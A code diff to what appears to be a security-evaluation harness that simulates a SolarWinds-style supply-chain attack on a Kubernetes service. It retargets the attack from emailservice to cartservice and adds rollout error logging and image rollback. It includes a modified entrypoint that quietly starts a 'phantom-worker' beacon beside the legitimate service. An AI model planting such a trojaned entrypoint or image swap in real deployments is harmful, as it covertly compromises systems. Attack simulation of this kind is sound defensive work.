@@ -76,7 +76,7 @@ _SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
 _SINK_PORT = 4446
 _WORKER_BIN = "/usr/local/bin/phantom-worker"
 _WORKER_PROCESS_NAME = "phantom-worker"
-_DEPLOYMENT_NAME = "emailservice"
+_DEPLOYMENT_NAME = "cartservice"
 
 # The phantom-worker beacon script (written into the attack image).
 _WORKER_SCRIPT = textwrap.dedent("""\
@@ -99,7 +99,7 @@ _WORKER_SCRIPT = textwrap.dedent("""\
 _START_SCRIPT = textwrap.dedent("""\
     #!/bin/sh
     # start.sh — modified entrypoint for PHANTOM SolarWinds-style evaluation.
-    # Starts the legitimate emailservice AND the phantom-worker.
+    # Starts the legitimate cartservice AND the phantom-worker.
     /usr/local/bin/phantom-worker &
     exec /start.sh "$@"
 """)
@@ -340,19 +340,50 @@ class SolarWindsStyleAttack(BaseAttack):
         )
         log.info("solarwinds.inject.image_set", extra={"attack_image": self._attack_image})
 
-        # 4. Wait for rollout.
-        try:
-            self._kubectl(
+        # 4. Wait for rollout with full error capture.
+        rollout_result = subprocess.run(
+            [
+                "kubectl", "rollout", "status",
+                f"deployment/{_DEPLOYMENT_NAME}",
+                "-n", target_namespace,
+                "--timeout=120s",
+            ],
+            capture_output=True,
+            text=True,
+            timeout=130,
+            check=False,
+        )
+        if rollout_result.returncode != 0:
+            # Capture pod logs for diagnosis.
+            pod_logs = subprocess.run(
                 [
-                    "rollout", "status",
-                    f"deployment/{_DEPLOYMENT_NAME}",
+                    "kubectl", "logs",
+                    "-l", f"app={_DEPLOYMENT_NAME}",
                     "-n", target_namespace,
-                    "--timeout=120s",
+                    "--tail=20",
                 ],
-                timeout=130,
+                capture_output=True, text=True, check=False,
             )
-        except subprocess.CalledProcessError as exc:
-            log.error("solarwinds.inject.rollout_failed", extra={"error": str(exc)})
+            log.error(
+                "solarwinds.inject.rollout_failed",
+                extra={
+                    "returncode": rollout_result.returncode,
+                    "stdout": rollout_result.stdout[-500:],
+                    "stderr": rollout_result.stderr[-500:],
+                    "pod_logs": pod_logs.stdout[-500:],
+                },
+            )
+            # Rollback to original image before returning failure.
+            if self._original_image:
+                subprocess.run(
+                    [
+                        "kubectl", "set", "image",
+                        f"deployment/{_DEPLOYMENT_NAME}",
+                        f"{container_name}={self._original_image}",
+                        "-n", target_namespace,
+                    ],
+                    check=False,
+                )
             return False
 
         log.info("solarwinds.inject.rollout_complete")
@@ -428,19 +459,56 @@ class SolarWindsStyleAttack(BaseAttack):
 
         ok = True
 
-        # Rollback via undo (returns to the previous ReplicaSet).
-        try:
-            self._kubectl(
+        # Use stored original image if available, otherwise rollout undo.
+        if hasattr(self, '_original_image') and self._original_image:
+            # Discover container name.
+            try:
+                cn_result = self._kubectl(
+                    [
+                        "get", "deployment", _DEPLOYMENT_NAME,
+                        "-n", target_namespace,
+                        "-o", "jsonpath={.spec.template.spec.containers[0].name}",
+                    ],
+                    timeout=15,
+                )
+                container_name = cn_result.stdout.strip() or _DEPLOYMENT_NAME
+            except Exception:
+                container_name = _DEPLOYMENT_NAME
+
+            result = subprocess.run(
                 [
-                    "rollout", "undo",
+                    "kubectl", "set", "image",
                     f"deployment/{_DEPLOYMENT_NAME}",
+                    f"{container_name}={self._original_image}",
                     "-n", target_namespace,
                 ],
-                timeout=30,
+                capture_output=True, text=True, check=False,
             )
-        except subprocess.CalledProcessError as exc:
-            log.error("solarwinds.recover.undo_failed", extra={"error": str(exc)})
-            ok = False
+            if result.returncode != 0:
+                log.error(
+                    "solarwinds.recover.set_image_failed",
+                    extra={"stderr": result.stderr[-200:]},
+                )
+                ok = False
+            else:
+                log.info(
+                    "solarwinds.recover.image_restored",
+                    extra={"image": self._original_image},
+                )
+        else:
+            log.warning("solarwinds.recover.no_original_image — using rollout undo")
+            try:
+                self._kubectl(
+                    [
+                        "rollout", "undo",
+                        f"deployment/{_DEPLOYMENT_NAME}",
+                        "-n", target_namespace,
+                    ],
+                    timeout=30,
+                )
+            except subprocess.CalledProcessError as exc:
+                log.error("solarwinds.recover.undo_failed", extra={"error": str(exc)})
+                ok = False
 
         # Wait for rollout.
         try:
